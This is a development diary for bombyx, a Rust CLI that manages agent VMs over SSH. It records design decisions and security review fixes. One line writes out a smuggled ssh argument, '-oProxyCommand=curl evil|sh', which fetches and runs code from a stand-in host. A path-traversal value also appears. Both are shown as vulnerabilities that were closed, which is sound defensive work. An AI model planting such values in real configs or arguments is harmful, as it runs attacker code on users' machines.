Development diary for bombyx. Newest entries first.

**Initial scaffold: a thin SSH control plane for agent VMs**

Started bombyx from the
[rustbase](https://github.com/breki/rustbase) template at
`f40582f` (v0.17.0), pruned to a CLI-only project -- the
template's web crate, frontend, E2E suite and deploy
subsystem are all gone, since bombyx has no runtime
services.

The shape of the tool follows from one decision: **the repo
is the source of truth, and the VM host holds only a
cache**. Each project keeps its `vagrant/` directory in its
own repo; `bombyx up` pushes it to the host and then runs
`vagrant` there over SSH. The host can therefore never
silently drift from the repo, and there is no state on the
host worth backing up.

The second decision is **wrap, don't reimplement**. bombyx
composes `ssh`, `scp`, `tar` and `vagrant` and nothing more.
If it breaks, `ssh frosti` and `vagrant up` by hand still
work -- which matters for a tool whose job is to be the only
thing standing between an agent and your credentials.

Four modules carry the work:

- `config.rs` parses `bombyx.toml` into typed `thiserror`
  errors and resolves the remote paths.
- `name.rs` holds `ScratchName`, a validated single path
  segment.
- `remote.rs` builds the command lines. Nothing here spawns
  a process: every function returns the argv to run.
- `plan.rs` maps an `Action` to the ordered command list.

Keeping the command construction pure is what makes
`--dry-run` trustworthy enough to develop against, and it is
why `plan.rs` lives in the library rather than in
`src/bin/` -- the project excludes `src/bin/` from coverage,
so policy sitting there would ship untested.

**The push mechanism took two attempts.** The obvious
`scp -r vagrant host:~/vms/phren/` is wrong, and wrong in a
way that only shows up on the *second* run: `scp -r` copies
*into* an existing destination, like `cp -r`. The first push
creates `~/vms/phren/vagrant`; the second creates
`~/vms/phren/vagrant/vagrant`, one level deeper every time.
Replaced it with a tar round-trip -- `tar -czf <a> -C <dir>
.` locally, `scp` the archive, then extract on the host. The
`-C <dir> .` is the load-bearing part: it archives the
directory's *contents*, so extraction lands files directly
in the target and repeated pushes overwrite in place.

`rsync` would have solved this more cleanly, and was
rejected on one ground: it is not present on a stock Windows
workstation, which is exactly where bombyx runs.

A related bug fell out of the same pass: `up` pushed to one
directory but ran `vagrant` in another, and `scratch` never
pushed at all, so it ran `vagrant up` in an empty directory,
guaranteed. Both now go through a shared `boot` helper.

**Then the reviewers took the scaffold apart.** Two
read-only agents (a security/correctness pass and a
craftsmanship pass) reviewed the initial commit and returned
23 findings between them, four of which they raised
independently. Enough of them were real, and load-bearing,
that fixing them before the first commit was the only honest
option. The ones worth recording:

*The default configuration did not work.* Every remote path
was single-quoted for safety, including the default
`remote_root = "~/vms"`. A POSIX shell does not expand `~`
inside single quotes, so `mkdir -p '~/vms/phren'` created a
directory *literally named* `~` under the login directory.
Meanwhile the `scp` destination interpolated the same path
unquoted, where `~` *does* expand -- so the archive landed
in the real `$HOME/vms/phren` while `vagrant up` ran in the
bogus tree with no Vagrantfile. Worse, the tests asserted
the quoted form, so they locked the bug in. The fix is
`quote_remote_path`, which leaves only the tilde outside the
quotes: `~/'vms/phren'`. Everything an attacker could
influence stays quoted, and the shell still expands the home
directory.

That one is the cleanest illustration of why the project's
Definition of Done requires a real VM host: the argv was
provably correct and provably useless.

*Two ways a cloned repo could run code on the workstation.*
`host` was passed as the first positional argument to `ssh`,
which has no `--` separator -- so a repo shipping `host =
"-oProxyCommand=curl evil|sh"` would execute that on *your
machine*, from a bare `bombyx status`, before any network
traffic. And the `scp` destination was the one path in the
module that skipped quoting entirely. Since `bombyx.toml`
travels inside a repo, it is attacker-controlled data the
moment you check out someone else's branch. Both are now
closed by allowlist validation in `Config::validate`. For a
tool whose entire purpose is containing untrusted code,
shipping either would have been embarrassing.

*Quoting is not validation.* The `scratch <name>` argument
was correctly quoted and still a traversal: `'../../../../etc'`
is a perfectly valid quoted string that still means `/etc`,
and the next step extracts a tar over it. `ScratchName` now
makes the safe shape a parsing step, so an invalid name
cannot reach a path at all. Related: scratch directories
omitted the project name, so `scratch pr-1` from two
projects resolved to the same directory on the host.

*The push clobbered the thing it promised not to.* The doc
comment and the README both stated that `.vagrant/` on the
host is left alone. But `tar -C <dir> .` includes dotfiles,
so a developer who had ever run `vagrant` locally shipped
their own `.vagrant/` and overwrote the host's machine
identity, orphaning the running VM. Now excluded explicitly,
with a test.

*Windows, the primary platform.* `std::env::temp_dir()`
returns `C:\Users\...`, and `scp` reads everything before
the first colon as a host name -- so `up` would have tried
to connect to a host called `C`. The archive now keeps a
bare file name and `tar`/`scp` run *in* its directory.

The remaining fixes were smaller: a fixed temp-file name
replaced by a per-run private directory (a co-user could
pre-create the path; two concurrent runs raced; and
`--dry-run` deleted the file, so a flag documented as
"print, don't run" had a destructive side effect); `&&`-
chained remote cleanup that skipped on failure and left a
corrupt archive in the boot directory; remote exit codes
flattened to 1; `deny_unknown_fields` so a typo'd key is
reported instead of silently defaulting; and a batch of
loose `contains`/`starts_with` assertions replaced by
full-value and ordering checks, which is what let several of
these through in the first place.

Ended at 96 tests and 100% coverage.

**Status:** the command surface works and is well covered,
but it *still* has not been driven against a real VM host.
`--dry-run` proves the argv, and this session is a good
lesson in how little that guarantees. That verification is
the next step and is required before any of this can be
called done.
